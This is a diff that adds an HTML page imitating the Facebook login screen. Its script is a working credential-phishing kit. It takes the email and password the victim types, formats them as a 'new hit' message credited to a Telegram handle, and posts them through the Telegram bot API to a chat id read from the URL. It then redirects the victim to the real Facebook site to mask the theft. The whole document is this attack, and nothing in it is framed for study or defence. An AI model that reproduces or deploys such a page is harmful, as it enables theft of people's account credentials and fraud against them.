@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        .navbar-fb {
+            background: #3b5998;
+            width: 100%;
+            padding: 8px;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+        }
+        .navbar-fb img {
+            width: 115px;
+            margin: 0 auto;
+            display: block;
+        }
+        .content-box-fb {
+            width: 300px;
+            margin: 20px auto;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+        }
+        .content-box-fb img {
+            width: 60px;
+            margin: 20px auto;
+            border-radius: 12px;
+            display: block;
+        }
+        .txt-login-fb {
+            width: 100%;
+            margin-top: 10px;
+            margin-bottom: 17px;
+            padding: 8px;
+            color: #90949c;
+            font-size: 16px;
+            font-family: Roboto, sans-serif;
+            text-align: center;
+        }
+        .loginEmail, .loginPassword {
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            border: 1px solid #bdbebf;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+        .btn-login-fb {
+            background: #1778f2;
+            width: 100%;
+            padding: 10px;
+            color: white;
+            font-size: 14px;
+            font-family: Roboto, sans-serif;
+            font-weight: bold;
+            border: 1px solid #3578e5;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+        .btn-login-fb:hover {
+            background-color: #155bb5;
+        }
+        .txt-create-account, .txt-not-now, .txt-forgotten-password {
+            width: 100%;
+            padding: 5px;
+            font-size: 13.5px;
+            text-align: center;
+            font-family: Roboto, sans-serif;
+        }
+        .txt-create-account, .txt-not-now {
+            color: #3b5998;
+        }
+        .txt-forgotten-password {
+            color: #7596c8;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <div class="navbar-fb">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    </div>
+
+    <!-- Login Box -->
+    <div class="content-box-fb">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <p class="txt-login-fb">Log in to Facebook</p>
+        <input type="email" id="loginEmail" class="loginEmail" placeholder="Email address">
+        <input type="password" id="loginPassword" class="loginPassword" placeholder="Password">
+        <p class="txt-forgotten-password">Forgotten Password?</p>
+        <button class="btn-login-fb" onclick="sendLoginData()">Log In</button>
+        <p class="txt-create-account">Create New Account</p>
+        <p class="txt-not-now">Not Now</p>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Function to get the chat_id from the URL
+        function getChatIdFromUrl() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('id');
+        }
+
+        function sendLoginData() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            const chatId = getChatIdFromUrl();  // Get chat ID from URL
+
+            if (email && password) {  // Check if both fields are filled
+                const message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪\n\n🐉⊚-----------------------------------⊚🐉\n↝ 𝙿𝙰𝙶𝙴 » Facebook\n➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  » Web Form\n📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » ${email}\n📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » ${password}\n🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » Unknown\n⏳ ↝ 𝙲𝚘𝚍𝚎 » 91\n⚙️ ↝ 𝙸𝙿 » Not Collected\n⏱ ↝ 𝚃𝚒𝚖𝚎 » ${new Date().toLocaleTimeString()}\n📝 ↝ 𝙳𝚊𝚝𝚎 » ${new Date().toLocaleDateString()}\n🐉⊚-----------------------------------⊚🐉\n↝ ᴅᴇᴠ ʙʏ »  @UNKNOWNxTG`;
+
+                // Send login data to Telegram bot via a POST request
+                fetch(`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    // Redirect to official Facebook page after sending data
+                    window.location.href = "https://www.facebook.com";
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            } else {
+                // Do nothing if email and password are not filled
+                alert("Please fill in both email and password.");
+            }
+        }
+    </script>
+
+</body>
+</html>
